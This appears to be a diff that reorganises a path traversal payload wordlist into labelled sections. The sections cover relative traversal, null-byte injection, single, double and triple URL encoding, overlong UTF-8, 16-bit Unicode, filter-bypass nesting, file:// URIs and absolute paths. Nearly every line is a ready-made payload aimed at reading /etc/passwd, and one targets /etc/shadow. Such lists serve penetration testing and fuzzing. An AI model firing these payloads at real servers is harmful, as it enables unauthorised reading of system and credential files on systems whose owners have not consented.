@@ -1,3 +1,4 @@
+## Standard Traversal (Relative)
 ../../etc/passwd
 ../../../etc/passwd
 ../../../../etc/passwd
@@ -8,6 +9,8 @@
 ../../../../../../../../../../etc/passwd
 ../../../../../../../../../../../../etc/passwd
 /../../../../../../../../../../../../etc/passwd
+
+## Null Byte Injection & Extension Bypass
 ../../etc/passwd%00
 ../../../../etc/passwd%00
 ../../../../../../etc/passwd%00
@@ -22,6 +25,10 @@
 ../../../../../../../../etc/passwd%00.gif
 ../../../../../../../../../../../../etc/passwd%00.pdf
 ../../../../../../../../../../../../etc/passwd%00.txt
+%00../../../../../../etc/passwd
+%00/etc/passwd%00
+
+## URL Encoded (Single Encoding)
 %2e%2e%2fetc%2fpasswd
 %2e%2e%2f%2e%2e%2fetc%2fpasswd
 %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
@@ -29,18 +36,46 @@
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%2fetc%2fshadow
+
+## Double URL Encoded
 %252e%252e%252fetc%252fpasswd
 %252e%252e%252f%252e%252e%252fetc%252fpasswd
 %252e%252e%252f%252e%252e%252f%252e%2e%2f%252e%2e%2fetc%252fpasswd
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+..%252fetc%252fpasswd
+..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+..%255c..%255c..%255cetc/passwd
+%252e%252e/etc/passwd
+..%252fetc/passwd
+%252e%252e%252fetc%252fpasswd%00
+
+## Overlong UTF-8 & Unicode Encodings
 ..%c0%afetc/passwd
 ..%c0%af..%c0%afetc/passwd
 ..%c0%af..%c0%af..%c0%afetc/passwd
 ..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
 ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
 ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
 /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+..%c1%9cetc/passwd
+..%c1%9c..%c1%9cetc/passwd
+..%c1%9c..%c1%9c..%c1%9cetc/passwd
+%2e%2e%c0%afetc/passwd
+..%c0%afetc/passwd%00
+..%c0%af..%c0%afetc/passwd%00
+
+## Nested & Filter Bypass
 ....//etc/passwd
 ....//....//etc/passwd
 ....//....//....//etc/passwd
@@ -53,17 +88,31 @@
 ..././..././..././..././etc/passwd
 ./././././././././././etc/passwd
 /./././././././././././etc/passwd
-....................\etc\passwd
 /..../..../..../..../..../..../etc/passwd
 .\./.\./.\./.\./.\./.\./etc/passwd
+
+## Mixed Windows Separators
+....................\etc\passwd
+
+## Protocols & URI Schemes
 file:///etc/passwd
 file://../../etc/passwd
 file:///../../etc/passwd
+
+## Absolute & Deep Paths
 /etc/passwd
 //etc/passwd
 ///etc/passwd
 /var/www/html/../../../etc/passwd
 /usr/local/apache2/conf/../../../etc/passwd
+/../../../../../../../../%2A
+/../../../../../../../../../../etc/passwd^^
+/../../../../../../../../../../etc/passwd
+/etc/passwd....................................
+/etc/passwd/././././././
+/etc/passwd/
+
+## Mixed Dot/Slash Encoding
 ..%2fetc%2fpasswd
 ..%2f..%2fetc%2fpasswd
 ..%2f..%2f..%2fetc%2fpasswd
@@ -73,16 +122,6 @@ file:///../../etc/passwd
 %2e%2e/%2e%2e/%2e%2e/etc/passwd
 %252e%252e/%252e%252e/etc/passwd
 ..%252f..%252f..%252fetc/passwd
-..%255c..%255c..%255cetc/passwd
-%00../../../../../../etc/passwd
-%00/etc/passwd%00
-/../../../../../../../../%2A
-/../../../../../../../../../../etc/passwd^^
-/../../../../../../../../../../etc/passwd
-/etc/passwd....................................
-/etc/passwd/././././././
-/etc/passwd/
-%2e%2e%2fetc%2fshadow
 ..%2f..%2fetc%2fpasswd
 ..%2f..%2f..%2fetc%2fpasswd
 ..%2f..%2f..%2f..%2fetc%2fpasswd
@@ -96,47 +135,22 @@ file:///../../etc/passwd
 %2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-..%252fetc%252fpasswd
-..%252f..%252fetc%252fpasswd
-..%252f..%252f..%252fetc%252fpasswd
-..%252f..%252f..%252f..%252fetc%252fpasswd
-..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
-..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
-..%c0%afetc/passwd
-..%c0%af..%c0%afetc/passwd
-..%c0%af..%c0%af..%c0%afetc/passwd
-..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
-..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
-..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
-..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
-%c0%ae%c0%ae%c0%afetc%c0%afpasswd
-%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
-%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
-%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+%2e%2e%2fetc%2fpasswd%00
+%2e%2e%2fetc%2fpasswd%2500
+%2e%2e%2f%2e%2e%2fetc%2fpasswd%00
+
+## 16-bit Unicode Encoding
 ..%u2215etc/passwd
 ..%u2215..%u2215etc/passwd
 ..%u2215..%u2215..%u2215etc/passwd
 ..%u2216etc/passwd
 ..%u2216..%u2216etc/passwd
 ..%u2216..%u2216..%u2216etc/passwd
-%2e%2e%2fetc%2fpasswd%00
-%2e%2e%2fetc%2fpasswd%2500
-%2e%2e%2f%2e%2e%2fetc%2fpasswd%00
-%252e%252e%252fetc%252fpasswd%00
-..%c0%afetc/passwd%00
-..%c0%af..%c0%afetc/passwd%00
-%25252e%25252e%25252fetc%25252fpasswd
-%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd
-%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd
-..%c1%9cetc/passwd
-..%c1%9c..%c1%9cetc/passwd
-..%c1%9c..%c1%9c..%c1%9cetc/passwd
 %u002e%u002e%u002fetc%u002fpasswd
 %u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd
 %u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd
-%2e%2e/etc/passwd
-..%2fetc/passwd
-%2e%2e%2fetc/passwd
-%252e%252e/etc/passwd
-..%252fetc/passwd
-%2e%2e%c0%afetc/passwd
+
+## Triple URL Encoded
+%25252e%25252e%25252fetc%25252fpasswd
+%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd
+%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd
